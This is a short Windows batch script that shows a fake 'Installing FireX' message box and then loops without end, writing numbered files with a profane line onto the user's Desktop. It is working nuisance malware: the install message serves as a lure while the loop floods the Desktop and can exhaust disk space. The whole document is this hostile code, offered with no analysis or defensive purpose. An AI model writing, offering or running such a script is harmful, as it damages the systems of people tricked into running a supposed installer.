@echo off
PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Installing FireX')"
:a
@set /a "a=%a%+1"
cd %HOMEPATH%
cd Desktop
echo GoFuckYourself > %a%
goto a